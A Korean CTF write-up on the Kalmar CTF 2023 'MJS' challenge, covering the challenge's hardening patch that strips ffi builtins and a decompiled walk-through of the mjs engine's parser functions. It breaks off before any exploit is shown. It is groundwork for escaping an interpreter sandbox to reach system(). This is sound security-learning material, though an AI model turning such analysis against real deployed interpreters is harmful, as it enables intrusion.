---
title: "Kalmar CTF 2023 - MJS"
# description: "Kalmar CTF 2023 - MJS"
dateString: March 2023
draft: false
tags: ["Kalmar CTF 2023","MJS js engine"]
weight: 30
date: 2023-03-13
categories: ["CTF"]
# cover:
    # image: ""
---
# MJS
CTF 당시에는 warm-up인데 자바스크립트 엔진이라 도망갔다.
구글링 잘했으면 바로 풀 수 있었을 것 같다.
## Analysis
```c
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND noninteractive

RUN apt-get update
RUN apt-get install -y xinetd python3 xxd

COPY mjs /
COPY ynetd /
COPY remote.py /

RUN echo "kalmar{redacted}" > /flag-$(head -c 16 /dev/urandom | xxd -p).txt

USER 1000:1000

EXPOSE 10002

CMD ./ynetd -p 10002 "timeout 60 ./remote.py"

```
22.04이다.
```c
diff --git a/Makefile b/Makefile
index d265d7e..d495e84 100644
--- a/Makefile
+++ b/Makefile
@@ -5,6 +5,7 @@ BUILD_DIR = build
 RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)
 DOCKER_GCC ?= $(RD) mgos/gcc
 DOCKER_CLANG ?= $(RD) mgos/clang
+CC = clang
 
 include $(SRCPATH)/mjs_sources.mk
 
@@ -81,7 +82,7 @@ CFLAGS += $(COMMON_CFLAGS)
 # NOTE: we compile straight from sources, not from the single amalgamated file,
 # in order to make sure that all sources include the right headers
 $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)
-	$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)
+	$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)
 
 $(BUILD_DIR):
 	mkdir -p $@
diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c
index 6f51e08..36c2b43 100644
--- a/src/mjs_builtin.c
+++ b/src/mjs_builtin.c
@@ -137,12 +137,12 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));
   mjs_set(mjs, obj, "print", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));
-  mjs_set(mjs, obj, "ffi", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));
-  mjs_set(mjs, obj, "ffi_cb_free", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));
-  mjs_set(mjs, obj, "mkstr", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));
+  /* mjs_set(mjs, obj, "ffi", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */
+  /* mjs_set(mjs, obj, "ffi_cb_free", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */
+  /* mjs_set(mjs, obj, "mkstr", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */
   mjs_set(mjs, obj, "getMJS", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));
   mjs_set(mjs, obj, "die", ~0,
@@ -151,8 +151,8 @@ void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) {
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));
   mjs_set(mjs, obj, "chr", ~0,
           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));
-  mjs_set(mjs, obj, "s2o", ~0,
-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));
+  /* mjs_set(mjs, obj, "s2o", ~0, */
+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */
 
   /*
    * Populate JSON.parse() and JSON.stringify()
diff --git a/src/mjs_exec.c b/src/mjs_exec.c
index bd48fea..24c2c7c 100644
--- a/src/mjs_exec.c
+++ b/src/mjs_exec.c
@@ -835,7 +835,7 @@ MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) {
 
           *func = MJS_UNDEFINED;  // Return value
           // LOG(LL_VERBOSE_DEBUG, ("CALLING  %d", i + 1));
-        } else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) {
+        } else if (mjs_is_ffi_sig(*func)) {
           /* Call ffi-ed function */
 
           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);

```
patch.diff가 주어진다.
```
https://github.com/cesanta/mjs
diff.patch is just hardening :)
```
README.txt가 주어졌다. 
diff.patch는 그냥 hardening 이라고 한다.

https://github.com/cesanta/mjs
깃허브에 들어가보면 diff에서 ffi를 왜 없애는지 알 수 있다.
```c
$ ./build/mjs -e 'ffi("double sin(double)")(1.23)'
0.942489
```
다음과 같이 쓸 수 있어서, system으로 바로 따는걸 막기 위해서 일부러 없애놓은 것 같다.

```c
mjs_err_t __cdecl mjs_exec_internal(mjs *mjs, const char *path, const char *code, int generate_jsc, mjs_val_t *res)
{
  size_t v5; // rax
  int v6; // eax
  char *v7; // rax
  _QWORD v9[2]; // [rsp+0h] [rbp-B0h] BYREF
  mjs *v10; // [rsp+10h] [rbp-A0h]
  char *filename; // [rsp+18h] [rbp-98h]
  __int64 v12; // [rsp+20h] [rbp-90h]
  FILE *fp; // [rsp+28h] [rbp-88h]
  char *data; // [rsp+30h] [rbp-80h]
  size_t size; // [rsp+38h] [rbp-78h] BYREF
  mjs_bcode_part *bp_0; // [rsp+40h] [rbp-70h]
  unsigned __int64 __vla_expr0; // [rsp+48h] [rbp-68h]
  _QWORD *v18; // [rsp+50h] [rbp-60h]
  const char *jscext; // [rsp+58h] [rbp-58h]
  int read_mmapped; // [rsp+64h] [rbp-4Ch]
  int rewrite; // [rsp+68h] [rbp-48h]
  int basename_len; // [rsp+6Ch] [rbp-44h]
  const char *jsext; // [rsp+70h] [rbp-40h]
  mjs_val_t r; // [rsp+78h] [rbp-38h] BYREF
  size_t off; // [rsp+80h] [rbp-30h]
  mjs_val_t *resa; // [rsp+88h] [rbp-28h]
  int generate_jsca; // [rsp+94h] [rbp-1Ch]
  const char *JS_CODE; // [rsp+98h] [rbp-18h]
  const char *patha; // [rsp+A0h] [rbp-10h]
  mjs *mjsa; // [rsp+A8h] [rbp-8h]

  mjsa = mjs;
  patha = path;                                 // <stdin>
  JS_CODE = code;
  generate_jsca = generate_jsc;
  resa = res;
  off = mjs->bcode_len;
  r = 0xFFF3000000000000LL;
  mjs->error = mjs_parse(path, code, mjs);
  if ( cs_log_level_0 >= 4 )
    mjs_dump(mjsa, 1);
  if ( generate_jsca == -1 )
    generate_jsca = (*((_BYTE *)mjsa + 464) & 4) != 0;
  if ( mjsa->error == MJS_OK )
  {
    if ( generate_jsca )
    {
      if ( patha )
      {
        jsext = ".js";
        v12 = (int)strlen(patha);
        basename_len = v12 - strlen(".js");
        if ( basename_len > 0 && !strcmp(&patha[basename_len], jsext) )
        {
          rewrite = 1;
          read_mmapped = 1;
          jscext = ".jsc";
          v9[1] = basename_len;
          v5 = strlen(".jsc");
          v18 = v9;
          filename = (char *)v9 - ((basename_len + v5 + 16) & 0xFFFFFFFFFFFFFFF0LL);
          __vla_expr0 = basename_len + v5 + 1;
          memcpy(filename, patha, basename_len);
          strcpy(&filename[basename_len], jscext);
          v10 = mjsa;
          v6 = mjs_bcode_parts_cnt(mjsa);
          bp_0 = mjs_bcode_part_get(v10, v6 - 1);
          data = cs_mmap_file(filename, &size);
          if ( data )
          {
            if ( size == bp_0->data.len && !memcmp(data, bp_0->data.p, size) )
              rewrite = 0;
            munmap(data, size);
          }
          if ( rewrite )
          {
            fp = fopen64(filename, "wb");
            if ( fp )
            {
              fwrite(bp_0->data.p, bp_0->data.len, 1uLL, fp);
              fclose(fp);
            }
            else
            {
              if ( cs_log_print_prefix(LL_WARN, "src/mjs_exec.c", 1054) )
                cs_log_printf("Failed to open %s for writing", filename);
              read_mmapped = 0;
            }
          }
          if ( read_mmapped )
          {
            free((void *)bp_0->data.p);
            v7 = cs_mmap_file(filename, &bp_0->data.len);
            bp_0->data.p = v7;
            *((_BYTE *)bp_0 + 24) = *((_BYTE *)bp_0 + 24) & 0xEF | 0x10;
          }
        }
      }
    }
    mjs_execute(mjsa, off, &r);
```
mjs_exec_internal 함수의 인자로 path가 주어지는데, 이건 -e 옵션으로 직접 js 코드를 주면, `<stdin>` 문자열의 주소가 된다.
code는 말 그대로 js code의 포인터이다.
mjs는 그냥 mjs 객체이다.

mjs_parse와 mjs_execute가 분석해야할 주요 함수이다.
간단하게 기능을 알아보자면, mjs_parse는 문법을 분석해서 바이트 코드를 점화해서 mjs 객체에 추가해놓는다.
그리고 mjs_execute는 점화된 바이트 코드를 실행한다.
### mjs_parse
```c
mjs_err_t __cdecl mjs_parse(const char *path, const char *CODE_, mjs *mjs)
{
  size_t v3; // rax
  mjs *a; // [rsp+8h] [rbp-B8h]
  const char *v6; // [rsp+10h] [rbp-B0h]
  int map_len; // [rsp+24h] [rbp-9Ch]
  size_t llen; // [rsp+28h] [rbp-98h]
  size_t start_idx; // [rsp+30h] [rbp-90h]
  pstate p; // [rsp+38h] [rbp-88h] BYREF
  mjs_err_t res; // [rsp+A4h] [rbp-1Ch]
  mjs *mjsa; // [rsp+A8h] [rbp-18h]
  const char *CODE; // [rsp+B0h] [rbp-10h]
  const char *patha; // [rsp+B8h] [rbp-8h]

  patha = path;
  CODE = CODE_;
  mjsa = mjs;
  res = MJS_OK;
  pinit(path, CODE_, &p);
  p.mjs = mjsa;
  p.cur_idx = mjsa->bcode_gen.len;
  emit_byte(&p, 0x24u);                         // OP_BCODE_HEADER = 0x24 start off
  start_idx = p.mjs->bcode_gen.len;
  mbuf_append(&p.mjs->bcode_gen, 0LL, 0xCuLL);
  a = p.mjs;
  v6 = patha;
  v3 = strlen(patha);
  mbuf_append(&a->bcode_gen, v6, v3 + 1);
  *(_DWORD *)&p.mjs->bcode_gen.buf[start_idx + 4] = p.mjs->bcode_gen.len - start_idx;
  p.start_bcode_idx = p.mjs->bcode_gen.len;
  p.cur_idx = p.mjs->bcode_gen.len;
  res = parse_statement_list(&p, 0);
  emit_byte(&p, 0x23u);                         // OP_EXIT
  *(_DWORD *)&p.mjs->bcode_gen.buf[start_idx + 8] = p.mjs->bcode_gen.len - start_idx;
  map_len = p.offset_lineno_map.len;
  llen = cs_varint_llen(SLODWORD(p.offset_lineno_map.len));
  mbuf_resize(&p.mjs->bcode_gen, llen + p.mjs->bcode_gen.size);
  cs_varint_encode(map_len, (uint8_t *)&p.mjs->bcode_gen.buf[p.mjs->bcode_gen.len], llen);
  p.mjs->bcode_gen.len += llen;
  mbuf_append(&p.mjs->bcode_gen, p.offset_lineno_map.buf, p.offset_lineno_map.len);
  *(_DWORD *)&p.mjs->bcode_gen.buf[start_idx] = p.mjs->bcode_gen.len - start_idx;
  mbuf_free(&p.offset_lineno_map);
  if ( res )
    mbuf_free(&mjsa->bcode_gen);
  else
    mjs_bcode_commit(mjsa);
  return res;
}
```
mjs_parse 함수의 모습이다.
pinit은 pstate를 초기화해주는 함수이다.

```
00000000 pstate          struc ; (sizeof=0x68, align=0x8, copyof_117)
00000000                                         ; XREF: mjs_parse/r
00000000                                         ; parse_return/r ...
00000000 file_name       dq ?                    ; offset
00000008 buf             dq ?                    ; offset
00000010 pos             dq ?                    ; offset
00000018 line_no         dd ?
0000001C last_emitted_line_no dd ?
00000020 offset_lineno_map mbuf ?                ; XREF: mjs_parse+142/r
00000020                                         ; mjs_parse+1B0/r ...
00000038 prev_tok        dd ?
0000003C                 db ? ; undefined
0000003D                 db ? ; undefined
0000003E                 db ? ; undefined
0000003F                 db ? ; undefined
00000040 tok             tok ?
00000050 mjs             dq ?                    ; XREF: mjs_parse+36/w
00000050                                         ; mjs_parse+3A/r ... ; offset
00000058 start_bcode_idx dd ?                    ; XREF: mjs_parse+E5/w
0000005C cur_idx         dd ?                    ; XREF: mjs_parse+42/w
0000005C                                         ; mjs_parse+F0/w
00000060 depth           dd ?
00000064                 db ? ; undefined
00000065                 db ? ; undefined
00000066                 db ? ; undefined
00000067                 db ? ; undefined
00000068 pstate          ends
00000068
```
pstate 구조체는 위와 같다.

초기화가 잘 된다음에, parse_statement_list 함수로 들어간다.
이 함수가 제일 중요한 함수다.
```c
mjs_err_t __cdecl parse_statement_list(pstate *p, int et)
{
  bool v3; // [rsp+Bh] [rbp-15h]
  int drop; // [rsp+Ch] [rbp-14h]
  mjs_err_t res; // [rsp+10h] [rbp-10h]

  res = MJS_OK;
  drop = 0;
  if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 147) )
    cs_log_printf("  PNEXT %d", 147LL);
  pnext(p);                                     // cur_tok = 0xCA -> STR
  while ( 1 )                                   // 8,9 ()
  {
    v3 = 0;
    if ( res == MJS_OK )
    {
      v3 = 0;
      if ( p->tok.tok )
        v3 = p->tok.tok != et;
    }
    if ( !v3 )
      break;
    if ( drop )
      emit_byte(p, 1u);
    res = parse_statement(p);
    drop = 1;
    while ( p->tok.tok == 3 )
    {
      if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 152) )
        cs_log_printf("  PNEXT %d", 152LL);
      pnext(p);
    }
  }
  if ( !drop )
    emit_byte(p, 0x11u);
  return res;
}
```
pnext 함수는 다음 코드의 부분까지 파싱하는 함수다.
```c
int __cdecl pnext(pstate *p)
{
  unsigned int tok; // [rsp+0h] [rbp-10h]
  int toka; // [rsp+0h] [rbp-10h]
  int tmp; // [rsp+4h] [rbp-Ch]
  int tmpa; // [rsp+4h] [rbp-Ch]

  tok = 1;
  skip_spaces_and_comments(p);
  p->tok.ptr = p->pos;
  p->tok.len = 1;
  if ( *p->pos )
  {
    if ( mjs_is_digit(*p->pos) )
    {
      tok = getnum(p);
    }
    else if ( *p->pos == '\'' || *p->pos == '"' )
    {
      tok = getstr(p);
    }
    else if ( mjs_is_ident(*p->pos) )
    {
      toka = getident(p);                       // GET ALPHABET KEYWORLD ex) let a
      tok = toka + is_reserved_word_token(p->tok.ptr, p->tok.len);// 32 reserved WORDS
    }
    else if ( strchr(",.:;{}[]()?", *p->pos) )
    {
      tok = *p->pos;
    }
    else
    {
      tmp = longtok3(p, '<', '<', '=');
      if ( tmp )
        goto LABEL_24;
      tmp = longtok3(p, '>', '>', '=');
      if ( tmp )
        goto LABEL_24;
      tmp = longtok4(p, '>', '>', '>', '=');
      if ( tmp )
        goto LABEL_24;
      tmp = longtok3(p, '>', '>', '>');
      if ( tmp )
        goto LABEL_24;
      tmp = longtok3(p, '=', '=', '=');
      if ( tmp
        || (tmp = longtok3(p, 33, 61, 61)) != 0
        || (tmp = longtok(p, "&", "&=")) != 0
        || (tmp = longtok(p, "|", "|=")) != 0
        || (tmp = longtok(p, "<", "<=")) != 0
        || (tmp = longtok(p, ">", ">=")) != 0
        || (tmp = longtok(p, "-", "-=")) != 0
        || (tmp = longtok(p, "+", "+=")) != 0 )
      {
LABEL_24:
        tok = tmp;
      }
      else
      {
        tmpa = longtok(p, "^~+-%/*<>=!|&", "=");
        if ( tmpa )
          tok = tmpa;
      }
    }
  }
  else
  {
    tok = 0;
  }
  if ( *p->pos )
    ++p->pos;
  if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_tok.c", 250) )
    cs_log_printf("  --> %d [%.*s]", tok, p->tok.len, p->tok.ptr);
  p->prev_tok = p->tok.tok;
  p->tok.tok = ptranslate(tok);                 // 8,9 -> ()
  return p->tok.tok;
}
```
이런식으로 세미콜론을 기준으로 자르거나 하면서 파싱을 해준다.
```c
int __cdecl ptranslate(enum mjs_TOK tok)
{
  switch ( tok )
  {
    case 0x21:
      return 22;
    case 0x25:
      return 16;
    case 0x26:
      return 17;
    case 0x28:
      return 8;
    case 0x29:
      return 9;
    case 0x2A:
      return 12;
    case 0x2B:
      return 13;
    case 0x2C:
      return 4;
    case 0x2D:
      return 14;
    case 0x2E:
      return 20;
    case 0x2F:
      return 15;
    case 0x3A:
      return 2;
    case 0x3B:
      return 3;
    case 0x3C:
      return 24;
    case 0x3D:
      return 5;
    case 0x3E:
      return 25;
    case 0x3F:
      return 21;
    case 0x5B:
      return 10;
    case 0x5D:
      return 11;
    case 0x5E:
      return 19;
    case 0x7B:
      return 6;
    case 0x7C:
      return 18;
    case 0x7D:
      return 7;
    case 0x7E:
      return 23;
    case 0x213D:
      return 39;
    case 0x253D:
      return 36;
    case 0x2626:
      return 42;
    case 0x263D:
      return 34;
    case 0x2A3D:
      return 32;
    case 0x2B2B:
      return 29;
    case 0x2B3D:
      return 30;
    case 0x2D2D:
      return 28;
    case 0x2D3D:
      return 31;
    case 0x2F3D:
      return 33;
    case 0x3C3C:
      return 26;
    case 0x3C3D:
      return 40;
    case 0x3D3D:
      return 38;
    case 0x3E3D:
      return 41;
    case 0x3E3E:
      return 27;
    case 0x5E3D:
      return 37;
    case 0x7C3D:
      return 35;
    case 0x7C7C:
      return 43;
    case 0x213D3D:
      return 45;
    case 0x3C3C3D:
      return 46;
    case 0x3D3D3D:
      return 44;
    case 0x3E3E3D:
      return 47;
    case 0x3E3E3E:
      return 48;
    case 0x3E3E3E3D:
      return 49;
  }
  return tok;
}
```
이건 그냥 tok에 맞는게 있으면, 그걸 리턴해준다.
이부분은 소스코드를 보는게 더 이해가 잘된다.
```c
static int ptranslate(int tok) {
#define DT(a, b) ((a) << 8 | (b))
#define TT(a, b, c) ((a) << 16 | (b) << 8 | (c))
#define QT(a, b, c, d) ((a) << 24 | (b) << 16 | (c) << 8 | (d))
  /* Map token ID produced by mjs_tok.c to token ID produced by lemon */
  /* clang-format off */
  switch (tok) {
    case ':': return TOK_COLON;
    case ';': return TOK_SEMICOLON;
    case ',': return TOK_COMMA;
    case '=': return TOK_ASSIGN;
    case '{': return TOK_OPEN_CURLY;
    case '}': return TOK_CLOSE_CURLY;
    case '(': return TOK_OPEN_PAREN;
    case ')': return TOK_CLOSE_PAREN;
    case '[': return TOK_OPEN_BRACKET;
    case ']': return TOK_CLOSE_BRACKET;
    case '*': return TOK_MUL;
    case '+': return TOK_PLUS;
    case '-': return TOK_MINUS;
    case '/': return TOK_DIV;
    case '%': return TOK_REM;
    case '&': return TOK_AND;
    case '|': return TOK_OR;
    case '^': return TOK_XOR;
    case '.': return TOK_DOT;
    case '?': return TOK_QUESTION;
    case '!': return TOK_NOT;
    case '~': return TOK_TILDA;
    case '<': return TOK_LT;
    case '>': return TOK_GT;
    case DT('<','<'): return TOK_LSHIFT;
    case DT('>','>'): return TOK_RSHIFT;
    case DT('-','-'): return TOK_MINUS_MINUS;
    case DT('+','+'): return TOK_PLUS_PLUS;
    case DT('+','='): return TOK_PLUS_ASSIGN;
    case DT('-','='): return TOK_MINUS_ASSIGN;
    case DT('*','='): return TOK_MUL_ASSIGN;
    case DT('/','='): return TOK_DIV_ASSIGN;
    case DT('&','='): return TOK_AND_ASSIGN;
    case DT('|','='): return TOK_OR_ASSIGN;
    case DT('%','='): return TOK_REM_ASSIGN;
    case DT('^','='): return TOK_XOR_ASSIGN;
    case DT('=','='): return TOK_EQ;
    case DT('!','='): return TOK_NE;
    case DT('<','='): return TOK_LE;
    case DT('>','='): return TOK_GE;
    case DT('&','&'): return TOK_LOGICAL_AND;
    case DT('|','|'): return TOK_LOGICAL_OR;
    case TT('=','=','='): return TOK_EQ_EQ;
    case TT('!','=','='): return TOK_NE_NE;
    case TT('<','<','='): return TOK_LSHIFT_ASSIGN;
    case TT('>','>','='): return TOK_RSHIFT_ASSIGN;
    case TT('>','>','>'): return TOK_URSHIFT;
    case QT('>','>','>','='): return TOK_URSHIFT_ASSIGN;
  }
  /* clang-format on */
  return tok;
}
```

```c
mjs_err_t __cdecl parse_statement(pstate *p)
{
  int tok; // [rsp+8h] [rbp-18h]
  mjs_err_t res; // [rsp+Ch] [rbp-14h]

  if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 900) )
    cs_log_printf("[%.*s]", 10, p->tok.ptr);
  tok = p->tok.tok;
  switch ( tok )
  {
    case 3:
      emit_byte(p, 0x11u);
      if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 904) )
        cs_log_printf("  PNEXT %d", 904LL);
      goto LABEL_34;
    case 6:
      return parse_block(p, 1);
    case 0xCB:
      emit_byte(p, 0x11u);
      emit_byte(p, 0x20u);
      if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 919) )
        cs_log_printf("  PNEXT %d", 919LL);
      goto LABEL_34;
  }
  if ( (unsigned int)(tok - 0xCC) < 2 )
    goto LABEL_36;
  if ( tok == 0xCE )
  {
    emit_byte(p, 0x21u);
    if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 923) )
      cs_log_printf("  PNEXT %d", 923LL);
LABEL_34:
    pnext(p);
    return 0;
  }
  if ( (unsigned int)(tok - 0xD1) < 2 )
    goto LABEL_36;
  if ( tok == 0xD6 )
    return parse_for(p);
  if ( tok == 0xD8 )
    return parse_if(p);
  if ( (unsigned int)(tok - 0xDA) < 2 )
    goto LABEL_36;
  if ( tok == 0xDD )
    return parse_return(p);
  if ( tok == 0xDE || tok == 0xE0 || tok == 0xE2 || (unsigned int)(tok - 0xE4) < 2 )
    goto LABEL_36;
  switch ( tok )
  {
    case 0xE6:
      return parse_while(p);
    case 0xE7:
LABEL_36:
      mjs_set_errorf(p->mjs, MJS_SYNTAX_ERROR, "[%.*s] is not implemented", (unsigned int)p->tok.len, p->tok.ptr);
      return 1;
    case 0xE8:
      return parse_let(p);
  }
  while ( 1 )
  {
    res = parse_expr(p);
    if ( res )
      return res;
    if ( p->tok.tok != 4 )
      break;
    emit_byte(p, 1u);
    if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 948) )
      cs_log_printf("  PNEXT %d", 948LL);
    pnext(p);
  }
  return 0;
}
```
parse_statement 함수는 tok에 따라 잘 파싱을 해서 바이트 코드를 점화하는 함수다.
마지막에 parse_expr 함수를 호출한다.

parse_expr 함수는 말 그대로 expression을 파싱하는 함수다.
ternary, logical_or, logical_and, bitwise_or ... shift, plus, minus ... unary 이런식으로 함수를 계속 호출한다.
즉 그냥 연산자 우선순위를 구현한거라고 보면 된다.
```c
mjs_err_t __cdecl parse_expr(pstate *p)
{
  return parse_assignment(p, 0);
}
```
```c
mjs_err_t __cdecl parse_assignment(pstate *p, int prev_op)
{
  int op; // [rsp+4h] [rbp-1Ch]
  mjs_err_t res; // [rsp+8h] [rbp-18h]
  mjs_err_t resa; // [rsp+8h] [rbp-18h]

  res = parse_ternary(p, 0);
  if ( res == MJS_OK )
  {
    if ( findtok(&s_assign_ops, p->tok.tok) )
    {
      op = p->tok.tok;
      if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 503) )
        cs_log_printf("  PNEXT %d", 503LL);
      pnext(p);
      resa = parse_assignment(p, 0);
      if ( resa )
        return resa;
      emit_op(p, op);
    }
    return 0;
  }
  return res;
}
```
삼항 연산자를 먼저 파싱한다.
```c
mjs_err_t __cdecl parse_ternary(pstate *p, int prev_op)
{
  size_t off_else; // [rsp+0h] [rbp-30h]
  size_t off_endif; // [rsp+8h] [rbp-28h]
  size_t off_endifa; // [rsp+8h] [rbp-28h]
  size_t off_if; // [rsp+10h] [rbp-20h]
  mjs_err_t res; // [rsp+18h] [rbp-18h]
  mjs_err_t resa; // [rsp+18h] [rbp-18h]
  mjs_err_t resb; // [rsp+18h] [rbp-18h]

  res = parse_logical_or(p, 0);
  if ( res == MJS_OK )
  {
    if ( prev_op )
      emit_op(p, prev_op);
    if ( p->tok.tok == 21 )
    {
      if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 470) )
        cs_log_printf("  PNEXT %d", 470LL);
      pnext(p);
      emit_byte(p, 7u);
      off_if = p->cur_idx;
      emit_init_offset(p);
      resa = parse_ternary(p, 0);
      if ( resa )
        return resa;
      emit_byte(p, 4u);
      off_else = p->cur_idx;
      emit_init_offset(p);
      off_endif = p->cur_idx;
      emit_byte(p, 1u);
      if ( p->tok.tok != 2 )
      {
        mjs_set_errorf(
          p->mjs,
          MJS_SYNTAX_ERROR,
          "parse error at line %d: [%.*s]",
          (unsigned int)p->line_no,
          10LL,
          p->tok.ptr,
          off_else);
        return 1;
      }
      if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 485) )
        cs_log_printf("  PNEXT %d", 485LL);
      pnext(p);
      resb = parse_ternary(p, 0);
      if ( resb )
        return resb;
      off_endifa = off_endif + mjs_bcode_insert_offset(p, p->mjs, off_else, p->cur_idx - off_else - 1);
      mjs_bcode_insert_offset(p, p->mjs, off_if, off_endifa - off_if - 1);
    }
    return 0;
  }
  return res;
}
```
```c
mjs_err_t __cdecl parse_logical_or(pstate *p, int prev_op)
{
  uint8_t v2; // al
  size_t off_if; // [rsp+8h] [rbp-28h]
  int op; // [rsp+14h] [rbp-1Ch]
  mjs_err_t res; // [rsp+18h] [rbp-18h]
  int ops[2]; // [rsp+1Ch] [rbp-14h] BYREF
  int prev_opa; // [rsp+24h] [rbp-Ch]
  pstate *pa; // [rsp+28h] [rbp-8h]

  pa = p;
  prev_opa = prev_op;
  *(_QWORD *)ops = 43LL;
  ++p->depth;
  if ( pa->depth <= 512 )
  {
    res = parse_logical_and(pa, 0);
    if ( res == MJS_OK )
    {
      if ( prev_opa )
        emit_op(pa, prev_opa);
      if ( findtok(ops, pa->tok.tok) )
      {
        op = pa->tok.tok;
        off_if = 0LL;
        if ( ops[0] == 42 || ops[0] == 43 )
        {
          v2 = 6;
          if ( ops[0] == 42 )
            v2 = 8;
          emit_byte(pa, v2);
          off_if = pa->cur_idx;
          emit_init_offset(pa);
          emit_byte(pa, 1u);
          op = 0;
        }
        if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 460) )
          cs_log_printf("  PNEXT %d", 460LL);
        pnext(pa);
        res = parse_logical_or(pa, op);
        if ( res == MJS_OK && off_if )
          mjs_bcode_insert_offset(pa, pa->mjs, off_if, pa->cur_idx - off_if - 1);
      }
    }
  }
  else
  {
    mjs_set_errorf(pa->mjs, MJS_SYNTAX_ERROR, "parser stack overflow");
    res = MJS_SYNTAX_ERROR;
  }
  --pa->depth;
  return res;
}
```
함수 기본적인 틀은 다 똑같다. 
매크로로 구현해둬서 그렇다.
parse_unary에서만 조금 바뀐다.
```c
mjs_err_t __cdecl parse_unary(pstate *p, int prev_op)
{
  int op; // [rsp+4h] [rbp-1Ch]
  mjs_err_t res; // [rsp+8h] [rbp-18h]

  op = 0;
  if ( findtok(&s_unary_ops, p->tok.tok) )
  {
    op = p->tok.tok;
    if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 399) )
      cs_log_printf("  PNEXT %d", 399LL);
    pnext(p);
  }
  if ( findtok(&s_unary_ops, p->tok.tok) )
    res = parse_unary(p, prev_op);
  else
    res = parse_postfix(p, prev_op);
  if ( res )
    return res;
  if ( op )
  {
    if ( op == 14 )
      op = 51;
    if ( op == 13 )
      op = 50;
    emit_op(p, op);
  }
  return 0;
}
```
일반적인 문자들은 parse_postfix를 타고 들어간다.
```c
mjs_err_t __cdecl parse_postfix(pstate *p, int prev_op)
{
  int v2; // eax
  mjs_err_t res; // [rsp+8h] [rbp-18h]

  res = parse_call_dot_mem(p, prev_op);
  if ( res )
    return res;
  if ( p->tok.tok == 29 || p->tok.tok == 28 )
  {
    v2 = 53;
    if ( p->tok.tok == 29 )
      v2 = 52;
    emit_op(p, v2);
    if ( cs_log_print_prefix(LL_VERBOSE_DEBUG, "src/mjs_parser.c", 389) )
      cs_log_printf("  PNEXT %d", 389LL);
    pnext(p);
  }
  return 0;
}
```
parse_call_dot_mem은 그냥 소스코드로 보는게 더 편하다.
```c
static mjs_err_t parse_call_dot_mem(struct pstate *p, int prev_op) {
  int ops[] = {TOK_DOT, TOK_OPEN_PAREN, TOK_OPEN_BRACKET, TOK_EOF};
  mjs_err_t res = MJS_OK;
  if ((res = parse_literal(p, &p->tok)) != MJS_OK) return res;
  while (findtok(ops, p->tok.tok) != TOK_EOF) {
    if (p->tok.tok == TOK_OPEN_BRACKET) {
      int prev_tok = p->prev_tok;
      EXPECT(p, TOK_OPEN_BRACKET);
      if ((res = parse_expr(p)) != MJS_OK) return res;
      emit_byte(p, OP_SWAP);
      EXPECT(p, TOK_CLOSE_BRACKET);
      if (!findtok(s_assign_ops, p->tok.tok) &&
          !findtok(s_postfix_ops, p->tok.tok) &&
          /* TODO(dfrank): fix: it doesn't work for prefix ops */
          !findtok(s_postfix_ops, prev_tok)) {
        emit_byte(p, OP_GET);
      }
    } else if (p->tok.tok == TOK_OPEN_PAREN) {
      EXPECT(p, TOK_OPEN_PAREN);
      emit_byte(p, OP_ARGS);
      while (p->tok.tok != TOK_CLOSE_PAREN) {
        if ((res = parse_expr(p)) != MJS_OK) return res;
        if (p->tok.tok == TOK_COMMA) pnext1(p);
      }
      emit_byte(p, OP_CALL);
      EXPECT(p, TOK_CLOSE_PAREN);
    } else if (p->tok.tok == TOK_DOT) {
      EXPECT(p, TOK_DOT);
      if ((res = parse_call_dot_mem(p, TOK_DOT)) != MJS_OK) return res;
    }
  }
  (void) prev_op;
  return res;
}
```
()를 구분해서 arg도 잘 넣어준다.
parse_literal을 통해서 문자열을 읽는다.
